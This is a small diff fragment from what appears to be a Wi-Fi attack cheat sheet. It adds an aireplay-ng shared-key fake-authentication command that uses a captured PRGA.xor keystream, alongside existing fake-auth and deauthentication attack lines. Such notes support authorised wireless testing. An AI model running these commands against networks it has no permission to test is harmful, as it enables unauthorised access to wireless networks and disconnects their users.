@@ -207,6 +207,9 @@ aireplay-ng -1 60 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0
     # -1 = fake auth attack
     # 0 =  Re-association timing
 
+--Shared Key Authentication Fake (PRGA.xor will be captured by airodump; must be 144 bytes)    
+aireplay-ng -1 0 -e $ESSID -y [PRGA.xor] -a $AP_MAC -h $ATK_MAC mon0
+
 --Deauthentication Attack
 aireplay-ng -0 1 -a $AP_MAC  -c $VIC_STA_MAC mon0
    # -0 deauth attack
